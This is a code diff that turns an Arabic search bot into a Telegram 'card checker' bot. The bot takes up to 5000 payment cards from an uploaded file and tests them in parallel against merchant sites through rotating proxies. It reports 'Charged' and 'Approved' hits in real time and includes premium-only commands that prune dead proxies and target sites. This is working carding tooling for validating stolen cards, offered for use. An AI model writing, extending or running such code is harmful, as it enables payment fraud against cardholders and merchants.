+        await status_msg.edit(premium_emoji(f"🫦 File contains {len(cards)} cards. Limiting to first 5000 cards."))
+        cards = cards[:5000]
+
+    os.remove(file_path)
+
+    total_cards = len(cards)
+    await status_msg.edit(premium_emoji(f"🫦 Starting check for {total_cards} cards..."))
+
+    session_key = f"{user_id}_{status_msg.id}"
+    active_sessions[session_key] = {'paused': False}
+
+    all_results = {
+        'charged': [],
+        'approved': [],
+        'dead': [],
+        'total': total_cards,
+        'checked': 0,
+        'start_time': time.time()
     }
-    if len(results_text) > 4096:
-        for i in range(0, len(results_text), 4000):
-            bot.send_message(message.chat.id, results_text[i:i+4000])
-    else:
-        bot.reply_to(message, results_text)
 
-@bot.message_handler(commands=['search'])
-def handle_search(message):
-    user_id = message.from_user.id
-    api_key = user_api_keys.get(user_id)
-    if not api_key:
-        bot.reply_to(message, "لا يوجد مفتاح API. أضف مفتاحك أولاً باستخدام /addkey")
+    try:
+        queue = asyncio.Queue()
+        for card in cards:
+            queue.put_nowait(card)
+            
+        last_update_time = [time.time()]
+
+        async def worker():
+            while not queue.empty() and session_key in active_sessions:
+                session_state = active_sessions.get(session_key)
+                if not session_state:
+                    break
+                while session_state.get('paused', False):
+                    await asyncio.sleep(1)
+                    session_state = active_sessions.get(session_key)
+                    if not session_state:
+                        return
+                        
+                try:
+                    card = queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
+                    
+                current_sites = load_sites()
+                current_proxies = load_proxies()
+                if not current_sites or not current_proxies:
+                    break
+                
+                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
+                
+                all_results['checked'] += 1
+                
+                if res['status'] == 'Charged':
+                    all_results['charged'].append(res)
+                    await send_realtime_hit(user_id, res, 'Charged', username)
+                elif res['status'] == 'Approved':
+                    all_results['approved'].append(res)
+                    await send_realtime_hit(user_id, res, 'Approved', username)
+                else:
+                    all_results['dead'].append(res)
+                    
+                queue.task_done()
+                
+                # Real-time exact-completion update throttle (1.0 sec)
+                now = time.time()
+                if now - last_update_time[0] >= 1.0:
+                    last_update_time[0] = now
+                    if session_key in active_sessions:
+                        try:
+                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
+                        except Exception:
+                            pass
+
+        workers = [asyncio.create_task(worker()) for _ in range(10)]
+        
+        while workers:
+            if session_key not in active_sessions:
+                for w in workers:
+                    if not w.done():
+                        w.cancel()
+                break
+            done, pending = await asyncio.wait(workers, timeout=1.0)
+            workers = list(pending)
+        
+        if session_key in active_sessions:
+            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
+
+    except Exception as e:
+        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"))
+    finally:
+        if session_key in active_sessions:
+            del active_sessions[session_key]
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        await send_final_results(user_id, all_results)
+
+@bot.on(events.NewMessage(pattern='/proxy'))
+async def proxy_command(event):
+    """Check all proxies and remove dead ones using a test card and site"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
         return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "يرجى إرسال استعلام البحث: /search <استعلام>")
+
+    proxies = load_proxies()
+    if not proxies:
+        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."))
         return
-    query = " ".join(parts[1:])
-    bot.reply_to(message, f"جاري البحث عن: {query}")
-    results_text, urls = search_normal(query, api_key)
-    user_search_results[user_id] = {
-        'urls': urls,
-        'query': query,
-        'timestamp': datetime.now()
-    }
-    if len(results_text) > 4096:
-        for i in range(0, len(results_text), 4000):
-            bot.send_message(message.chat.id, results_text[i:i+4000])
-    else:
-        bot.reply_to(message, results_text)
 
-@bot.message_handler(commands=['export'])
-def handle_export(message):
-    user_id = message.from_user.id
-    if user_id not in user_search_results or not user_search_results[user_id]['urls']:
-        bot.reply_to(message, "لا توجد نتائج سابقة للتصدير. قم بالبحث أولاً.")
+    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."))
+
+    alive_proxies = []
+    dead_proxies = []
+    batch_size = 50
+
+    try:
+        for i in range(0, len(proxies), batch_size):
+            batch = proxies[i:i + batch_size]
+            tasks = [test_proxy(proxy) for proxy in batch]
+            results = await asyncio.gather(*tasks)
+
+            for res in results:
+                if res['status'] == 'alive':
+                    alive_proxies.append(res['proxy'])
+                else:
+                    dead_proxies.append(res['proxy'])
+
+            await status_msg.edit(
+                premium_emoji(
+                    f"🔥 Checking proxies...\n\n"
+                    f"<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n"
+                    f"<b>Alive:</b> {len(alive_proxies)}\n"
+                    f"<b>Dead:</b> {len(dead_proxies)}"
+                ),
+                parse_mode='html'
+            )
+
+        async with aiofiles.open(PROXY_FILE, 'w') as f:
+            for proxy in alive_proxies:
+                await f.write(f"{proxy}\n")
+
+        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n"
+        summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
+        summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
+        summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
+        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."
+
+        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
+
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {e}"))
+
+@bot.on(events.NewMessage(pattern='/fuck'))
+async def site_command(event):
+    """Check all sites and remove dead ones"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
         return
-    data = user_search_results[user_id]
-    urls = data['urls']
-    query = data['query']
-    file = create_txt_file(urls, query)
-    if file:
-        bot.send_document(message.chat.id, file, caption=f"تم تصدير {len(urls)} رابط لـ: {query}")
-    else:
-        bot.reply_to(message, "حدث خطأ في إنشاء الملف.")
 
-@bot.message_handler(commands=['getkey'])
-def get_key_guide(message):
-    guide_text = """
-كيفية الحصول على مفتاح API:
+    sites = load_sites()
+    if not sites:
+        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."))
+        return
 
-1. اذهب إلى: https://www.searchapi.io
-2. اضغط على Get Started Free
-3. سجل باستخدام بريدك الإلكتروني
-4. فعّل بريدك
-5. اذهب إلى لوحة التحكم
-6. انسخ المفتاح (يبدأ بـ sk_)
-7. استخدم الأمر /addkey متبوعاً بالمفتاح
+    proxies = load_proxies()
+    if not proxies:
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
+        return
 
-الخطة المجانية: 100 بحث شهرياً
-    """
-    bot.reply_to(message, guide_text)
+    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
 
-@bot.message_handler(func=lambda message: True)
-def handle_unknown(message):
-    user_id = message.from_user.id
-    lang = user_language.get(user_id, 'ar')
-    bot.reply_to(message, "أمر غير معروف. استخدم /start لعرض القائمة الرئيسية." if lang == 'ar' else "Unknown command. Use /start to show main menu.")
+    alive_sites = []
+    dead_sites = []
+    batch_size = 10
 
-if __name__ == "__main__":
-    print("تم تشيغل البوت يا شيطان الكوفي @Hammdn...")
-    bot.infinity_polling()
+    try:
+        for i in range(0, len(sites), batch_size):
+            batch = sites[i:i + batch_size]
+            fresh_proxies = load_proxies()
+            if not fresh_proxies: fresh_proxies = proxies
+
+            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
+
+            results = await asyncio.gather(*tasks)
+
+            for res in results:
+                if res['status'] == 'alive':
+                    alive_sites.append(res['site'])
+                else:
+                    dead_sites.append(res['site'])
+
+            await status_msg.edit(
+                premium_emoji(
+                    f"🔥 Checking sites...\n\n"
+                    f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
+                    f"<b>Alive:</b> {len(alive_sites)}\n"
+                    f"<b>Dead:</b> {len(dead_sites)}"
+                ),
+                parse_mode='html'
+            )
+
+        async with aiofiles.open(SITES_FILE, 'w') as f:
+            for site in alive_sites:
+                await f.write(f"{site}\n")
+
+        summary_msg = f"✅ **Site Check Complete!**\n\n"
+        summary_msg += f"**Total Sites:** {len(sites)}\n"
+        summary_msg += f"**Alive:** {len(alive_sites)}\n"
+        summary_msg += f"**Removed:** {len(dead_sites)}\n\n"
+        summary_msg += "`sites.txt` has been updated."
+
+        await status_msg.edit(premium_emoji(summary_msg))
+
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ An error occurred during site check: {e}"))
+
+# Callbacks for Pause/Resume/Stop
+@bot.on(events.CallbackQuery(pattern=b"pause"))
+async def pause_handler(event):
+    user_id = event.sender_id
+    message_id = event.message_id
+    session_key = f"{user_id}_{message_id}"
+    if session_key in active_sessions:
+        active_sessions[session_key]['paused'] = True
+        await event.answer(premium_emoji("⏸️ Paused"))
+
+@bot.on(events.CallbackQuery(pattern=b"resume"))
+async def resume_handler(event):
+    user_id = event.sender_id
+    message_id = event.message_id
+    session_key = f"{user_id}_{message_id}"
+    if session_key in active_sessions:
+        active_sessions[session_key]['paused'] = False
+        await event.answer(premium_emoji("▶️ Resumed"))
+
+@bot.on(events.CallbackQuery(pattern=b"stop"))
+async def stop_handler(event):
+    user_id = event.sender_id
+    message_id = event.message_id
+    session_key = f"{user_id}_{message_id}"
+    if session_key in active_sessions:
+        del active_sessions[session_key]
+        await event.answer(premium_emoji("🛑 Stopped"))
+        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))
+
+print("✅ Bot started successfully!")
+bot.run_until_disconnected()
